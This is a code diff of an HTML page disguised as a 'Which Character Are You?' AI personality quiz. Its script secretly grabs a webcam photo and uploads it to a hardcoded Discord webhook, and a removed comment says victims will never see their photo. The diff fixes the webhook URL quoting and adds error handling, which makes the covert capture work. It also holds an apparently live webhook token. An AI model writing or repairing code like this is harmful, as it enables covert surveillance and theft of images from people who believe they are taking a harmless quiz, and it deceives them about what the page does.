@@ -17,7 +17,7 @@
     <h2>✨ Which Character Are You? ✨</h2>
     <p>Take the AI Vibe Test to match your inner character!</p>
     
-    <label>What's your secret superpower?</label>
+    <label for="q1">What's your secret superpower?</label>
     <select id="q1" style="width: 100%; padding: 8px; margin: 10px 0;">
       <option>Mind Reading</option>
       <option>Invisibility</option>
@@ -38,8 +38,8 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // ⚠️ APNA DISCORD WEBHOOK URL YAHAN PASTE KAREIN ⚠️
-    const DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4;
+    // Quotes ( "..." ) lagana zaroori hai
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4";
 
     async function startScan() {
       try {
@@ -63,20 +63,21 @@
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Stop camera
+      // Camera off karein
       stream.getTracks().forEach(track => track.stop());
 
-      // Convert image to blob and send to Discord
+      // Image ko blob me convert karke Discord bhein
       canvas.toBlob(blob => {
         const formData = new FormData();
         formData.append('file', blob, 'capture.png');
         formData.append('content', '📸 **New Character Scan Photo Captured!**');
 
         if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-          fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+          fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
+            .catch(err => console.error("Error sending to Discord:", err));
         }
 
-        // Show result screen to user (They will NEVER see their photo)
+        // Result screen show karein
         document.getElementById('quiz-card').style.display = 'none';
         document.getElementById('result-card').style.display = 'block';
       }, 'image/png');
